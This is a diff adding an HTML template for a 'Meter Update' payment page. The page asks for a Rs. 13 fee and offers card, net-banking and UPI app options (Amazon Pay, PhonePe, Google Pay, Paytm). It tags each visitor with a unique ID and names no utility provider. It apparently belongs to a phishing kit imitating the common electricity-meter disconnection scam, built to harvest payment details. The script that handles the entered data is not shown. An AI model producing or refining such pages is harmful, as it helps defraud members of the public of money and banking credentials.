@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="Content-Security-Policy" content="script-src 'self'; script-src-attr 'none';">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>UPI Payment</title>
+  <link rel="stylesheet" href="/css/formpage2.css"/>
+</head>
+<body data-uid="<%= uniqueId %>">
+  <div class="wrapper">
+    <div class="card">
+      <div class="card-header">
+        <img src="/assets/meter_update.png" class="card-icon" alt="Meter Icon" />
+      </div>
+
+      <div class="title-container">Meter Update</div>
+
+      <div class="card-section">
+        <div class="section-title">Meter Bill</div>
+        <div>Meter Update Fees: Rs. 13</div>
+      </div>
+
+      <div class="select-title">Select Payment Method</div>
+
+      <div class="payment-option-row">
+        <input type="checkbox" id="feeConfirm" name="feeConfirm" checked />
+        <label for="feeConfirm">Rs. 13</label>
+      </div>
+
+      <!-- Debit/Credit Card button -->
+      <button id="btnCredit" class="btn-action">
+        Debit/Credit Card
+      </button>
+
+      <!-- Net Banking button -->
+      <button id="btnNetBanking" class="btn-action">
+        Net Banking
+      </button>
+
+      <div class="divider"></div>
+
+      <div class="upi-logo-container">
+        <img src="/assets/upi.png" class="upi-card-logo" alt="UPI Logo" />
+      </div>
+      <div class="inner-card">
+        <div class="payment-option-row radio">
+          <input type="radio" id="upi" name="paymentMethod" />
+          <label for="upi">
+            <div class="upi-text">
+              <div class="up-title">Pay by any UPI App</div>
+              <div class="up-sub">Google Pay, PhonePe, Paytm and more</div>
+            </div>
+            <img src="/assets/upi.png" class="upi-icon" alt="UPI" />
+          </label>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="upiOverlay" class="overlay">
+    <div class="overlay-content">
+      <span id="closeOverlay" class="overlay-close">&times;</span>
+      <h2 style="padding: 16px; font-size:16px; font-weight:500; margin-top:32px;">
+        Select a payment method
+      </h2>
+      <ul class="overlay-list">
+        <li class="payment-option-row">
+          <input type="radio" id="amazonPay" name="upiApp">
+          <label for="amazonPay">Amazon Pay UPI</label>
+          <img src="/assets/amazonepay.png" class="upi-app-icon" alt="Amazon Pay"/>
+        </li>
+        <li class="payment-option-row">
+          <input type="radio" id="phonePe" name="upiApp">
+          <label for="phonePe">PhonePe</label>
+          <img src="/assets/phonepey.jpg" class="upi-app-icon" alt="PhonePe"/>
+        </li>
+        <li class="payment-option-row">
+          <input type="radio" id="googlePay" name="upiApp">
+          <label for="googlePay">Google Pay</label>
+          <img src="/assets/gpay.jpeg" class="upi-app-icon" alt="Google Pay"/>
+        </li>
+        <li class="payment-option-row">
+          <input type="radio" id="paytm" name="upiApp">
+          <label for="paytm">Paytm</label>
+          <img src="/assets/paytm.png" class="upi-app-icon" alt="Paytm"/>
+        </li>
+      </ul>
+    </div>
+  </div>
+
+  <script src="/js/upi-overlay.js"></script>
+</body>
+</html>
